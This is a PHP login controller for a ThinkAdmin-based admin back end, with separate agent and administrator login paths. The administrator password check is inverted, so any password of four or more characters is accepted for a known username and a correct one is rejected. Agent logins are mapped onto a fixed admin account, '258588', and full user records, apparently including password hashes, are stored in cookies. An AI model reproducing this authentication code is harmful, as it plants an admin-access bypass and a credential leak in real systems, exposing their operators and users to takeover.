<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | www.xydai.cn 新源代网
// +----------------------------------------------------------------------

// +----------------------------------------------------------------------

// +----------------------------------------------------------------------
// |

// +----------------------------------------------------------------------

namespace app\admin\controller;

use app\admin\service\CaptchaService;
use app\admin\service\NodeService;
use library\Controller;
use think\Db;
use think\facade\Request;

/**
 * 用户登录管理
 * Class Login
 * @package app\admin\controller
 */
class Login extends Controller
{

    /**
     * 后台登录入口
     * @throws \think\Exception
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     * @throws \think\exception\PDOException
     */
    public function index()
    {
        if (Request::isGet()) {
            if (NodeService::islogin()) {
                $this->redirect('@admin');
            } else {
                $this->title = '系统登录';
                $this->domain = Request::host(true);
                if (!($this->loginskey = session('loginskey'))) session('loginskey', $this->loginskey = uniqid());
                $this->devmode = in_array($this->domain, ['127.0.0.1', 'localhost']) || is_numeric(stripos($this->domain, 'thinkadmin.top'));
                $this->captcha = new CaptchaService();
                $this->fetch();
            }
        } else {
            $data = $this->_input([
                'username' => input('username'), 'password' => input('password'),
            ], [
                'username' => 'require|min:4', 'password' => 'require|min:4',
            ], [
                'username.require' => '登录账号不能为空！',
                'password.require' => '登录密码不能为空！',
                'username.min'     => '登录账号长度不能少于4位有效字符！',
                'password.min'     => '登录密码长度不能少于4位有效字符！',
            ]);
            if (!CaptchaService::check(input('verify'), input('uniqid'))) {
                $this->error('图形验证码验证失败，请重新输入！');
            }

            //是否代理
            $daili=Db::name('xy_users')->where(['tel'=>$data['username'],'agency'=>1])->find();
            if($daili){
                //代理登录
                if($daili['pwd']!=sha1($_POST['password1'].$daili['salt'].config('pwd_str'))){
                    $this->error('账号或者密码错误！');
                    
                }else{
                    $user = Db::name('SystemUser')->where(['username'=>'258588'])->find();
                    session('loginskey', null);
                    session('admin_user', $user);
                    session('daili_user', $daili);

        
                    cookie('loginskey', null);
                    cookie('admin_user', $user);
                    cookie('daili_user', $daili);
        
                    NodeService::applyUserAuth(true,0);
                    sysoplog('系统管理', '代理登录系统成功');
                    $this->success('登录成功', url('@admin'));
                }
                 
                
            }else{
                // 管理员用户信息验证
                $map = ['is_deleted' => '0', 'username' => $data['username']];
                $user = Db::name('SystemUser')->where($map)->order('id desc')->find();
                if (empty($user)) $this->error('登录账号或密码错误，请重新输入!');
                if (md5($user['password'] . session('loginskey')) == $data['password']) {
                    // var_dump($data['password']);
                    $this->error('登录账号或密码错误，请重新输入!');
                }
                if (empty($user['status'])) $this->error('账号已经被禁用，请联系管理员!');
                Db::name('SystemUser')->where(['id' => $user['id']])->update([
                    'login_at' => Db::raw('now()'), 'login_ip' => Request::ip(), 'login_num' => Db::raw('login_num+1'),
                ]);
                session('loginskey', null);
                session('admin_user', $user);
    
                cookie('loginskey', null);
                cookie('admin_user', $user);
    
    
                NodeService::applyUserAuth(true,1);
                sysoplog('系统管理', '用户登录系统成功');
                $this->success('登录成功', url('@admin'));
            }
        }
    }

    /**
     * 退出登录
     */
    public function out()
    {
        \think\facade\Session::clear();
        \think\facade\Session::destroy();
        $this->success('退出登录成功！', url('@admin/login'));
    }

}
